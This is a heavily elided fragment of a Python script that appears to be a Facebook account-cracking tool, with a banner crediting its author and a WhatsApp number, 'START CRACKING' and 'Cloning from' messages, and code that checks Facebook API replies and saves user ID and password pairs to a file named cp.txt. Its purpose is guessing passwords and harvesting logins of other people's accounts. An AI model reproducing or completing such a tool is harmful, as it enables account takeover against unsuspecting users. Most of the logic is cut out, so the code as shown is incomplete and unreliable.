...
logo = """
     \033[1;92m████████╗ ██████╗ ██████╗ 
      ...
      \033[1;92m..:::::..::..:::::..:::......:::..::::::::::.......::::.......:::::..:::::
\033[1;93m----------------------------------------------------------------------------------------------------------
 \033[1;93m(*)\033[1;92m Author: Nzir KhaN
 \033[1;93m(*)\033[1;92m WhatsApp :   +923025669420
 \033[1;93m(*)\033[1;92m Github   : https://github.com/Gustah5
\033[1;93m----------------------------------------------------------------------------------------------------------
"""
def tool():
	os.system("clear")
...
def crack_select():
	...
	if select =="1":
		...
		try:
			...
			print(logo)
			print('')
			print("  Nzir KhaN START CRACKING.....")
			print('')
		...
		try:
			...
			print(logo)
			print('')
			print("  Nazir KhaN START CRACKING.....")
			print('')
			print("  Cloning from:\x1b[1;92m "+q["name"])
		except KeyError:
											...
											if "access_token" in q:
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													if "access_token" in q:
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;28m [CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
